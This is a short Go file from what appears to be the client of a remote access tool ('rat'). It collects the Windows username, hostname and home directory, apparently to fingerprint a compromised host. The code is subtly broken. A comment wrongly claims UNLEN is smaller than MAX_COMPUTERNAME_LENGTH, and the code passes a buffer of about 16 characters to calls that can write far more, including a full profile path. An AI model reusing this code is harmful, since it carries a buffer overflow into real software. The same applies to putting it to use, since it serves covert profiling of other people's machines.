package userinfo

/*
#include <windows.h>
#include <Shlobj.h>
*/
import "C"

import (
	"rat/client/utils"
	"rat/common"
	"unsafe"
)

func GetComputerInformation() common.Computer {
	info := common.Computer{}

	// UNLEN is less than MAX_COMPUTERNAME_LENGTH (Lmcons.h)
	const BufferSize = C.MAX_COMPUTERNAME_LENGTH + 1

	lpBuffer := make([]utils.WideChar, BufferSize)
	var lpnSize C.DWORD = BufferSize
	ptr := (*C.WCHAR)(unsafe.Pointer(&lpBuffer[0]))

	C.GetUserNameW(ptr, &lpnSize)
	info.Username = utils.GetWideString(lpBuffer[:lpnSize], int(lpnSize))

	lpnSize = BufferSize
	C.GetComputerNameW(ptr, &lpnSize)
	info.Hostname = utils.GetWideString(lpBuffer[:lpnSize], int(lpnSize))

	C.SHGetFolderPathW(nil, C.CSIDL_PROFILE, nil, 0, ptr)
	info.HomeDir = utils.GetWideString(lpBuffer, utils.GetLength(lpBuffer))

	return info
}
